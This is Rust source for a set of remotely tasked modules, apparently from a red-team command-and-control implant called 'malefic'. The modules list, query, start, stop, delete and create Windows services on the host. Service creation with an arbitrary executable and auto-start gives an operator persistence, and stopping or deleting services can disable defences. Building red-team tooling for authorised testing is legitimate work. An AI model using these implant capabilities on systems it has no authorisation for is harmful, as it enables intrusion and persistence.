use malefic_helper::win::service::{ServiceConfig, ServiceErrorControl, ServiceExitCode, ServiceManager, ServiceStartType, ServiceStatus};
use malefic_proto::proto::modulepb::Service;
use crate::prelude::*;

fn service_config_to_proto(config: &ServiceConfig) -> malefic_proto::proto::modulepb::ServiceConfig {
    let config = config.clone();
    malefic_proto::proto::modulepb::ServiceConfig {
        name: config.name.clone(),
        display_name: config.display_name.to_string_lossy().to_string(),
        executable_path: config.executable_path.to_string_lossy().to_string(),
        start_type: config.start_type as u32,
        error_control: config.error_control as u32,
        account_name: config.account_name.clone().unwrap_or_default().to_string_lossy().to_string(),
    }
}

fn service_status_to_proto(status: &ServiceStatus) -> malefic_proto::proto::modulepb::ServiceStatus {
    let status = status.clone();
    malefic_proto::proto::modulepb::ServiceStatus {
        current_state: status.current_state as u32,
        process_id: status.process_id.unwrap_or(0),
        exit_code: match status.exit_code {
            ServiceExitCode::Win32(code) => code,
            ServiceExitCode::ServiceSpecific(code) => code,
        },
        checkpoint: status.checkpoint,
        wait_hint: status.wait_hint.as_secs() as u32,
    }
}


pub struct ServiceList {}

#[async_trait]
#[module_impl("service_list")]
impl Module for ServiceList {}

#[async_trait]
impl ModuleImpl for ServiceList {
    async fn run(&mut self, id: u32, _receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
        let _ = check_request!(_receiver, Body::Request)?;
        let manager = ServiceManager::open()?;
        
        let services = manager.list_and_query()?;
        let mut resp = malefic_proto::proto::modulepb::ServicesResponse::default();
        
        for service in services {
            let config = service_config_to_proto(&service.config);
            let status = service_status_to_proto(service.status.as_ref().unwrap());
            resp.services.push(Service {
                config: Some(config),
                status: Some(status),
            });
        }

        // 返回服务列表
        Ok(TaskResult::new_with_body(id, Body::ServicesResponse(resp)))
    }
}

pub struct ServiceStart {}

#[async_trait]
#[module_impl("service_start")]
impl Module for ServiceStart {}
#[async_trait]
impl ModuleImpl for ServiceStart {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
        let req = check_request!(receiver, Body::ServiceRequest)?;
        let manager = ServiceManager::open()?;
        let config = manager.query_service(&req.name)?;
        manager.start_service(&config)?;

        Ok(TaskResult::new(id))
    }
}

pub struct ServiceStop {}

#[async_trait]
#[module_impl("service_stop")]
impl Module for ServiceStop {}

#[async_trait]
impl ModuleImpl for ServiceStop {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
        let req = check_request!(receiver, Body::ServiceRequest)?;
        let manager = ServiceManager::open()?;
        let config = manager.query_service(&req.name)?;
        manager.stop_service(&config)?;

        Ok(TaskResult::new(id))
    }
}

pub struct ServiceDelete {}

#[async_trait]
#[module_impl("service_delete")]
impl Module for ServiceDelete {}

#[async_trait]
impl ModuleImpl for ServiceDelete {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
        let req = check_request!(receiver, Body::ServiceRequest)?;

        let manager = ServiceManager::open()?;

        let config = manager.query_service(&req.name)?;

        manager.delete_service(&config)?;

        Ok(TaskResult::new(id))
    }
}


pub struct ServiceQuery {}

#[async_trait]
#[module_impl("service_query")]
impl Module for ServiceQuery {}
#[async_trait]
impl ModuleImpl for ServiceQuery {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
        let req = check_request!(receiver, Body::ServiceRequest)?;

        let manager = ServiceManager::open()?;

        let config = manager.query_service(&req.name)?;
        let status = manager.query_service_status(&config)?;

        Ok(TaskResult::new_with_body(id, Body::ServiceResponse(Service { 
            config: Some(service_config_to_proto(&config)), 
            status: Some(service_status_to_proto(&status)) 
        })))
    }
}


pub struct ServiceCreate {}

#[async_trait]
#[module_impl("service_create")]
impl Module for ServiceCreate {}

#[async_trait]
impl ModuleImpl for ServiceCreate {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
        // 从请求中获取 `ServiceRequest`
        let req = check_request!(receiver, Body::ServiceRequest)?;

        // 打开服务管理器
        let manager = ServiceManager::open()?;

        // 从请求数据中提取服务创建参数
        let service_name = req.name.clone();
        let display_name = req.display_name.clone();
        let executable_path = req.executable_path.clone();
        let start_type = match req.start_type {
            0 => ServiceStartType::BootStart,
            1 => ServiceStartType::SystemStart,
            2 => ServiceStartType::AutoStart,
            3 => ServiceStartType::DemandStart,
            _ => ServiceStartType::Disabled,
        };
        let error_control = match req.error_control {
            0 => ServiceErrorControl::Ignore,
            1 => ServiceErrorControl::Normal,
            2 => ServiceErrorControl::Severe,
            _ => ServiceErrorControl::Critical,
        };
        let account_name = req.account_name.clone();

        // 创建服务
        let _ = manager.create_service(
            &service_name,
            &display_name,
            &executable_path,
            start_type,
            error_control,
            Some(&*account_name)
        )?;
        
        Ok(TaskResult::new(id))
    }
}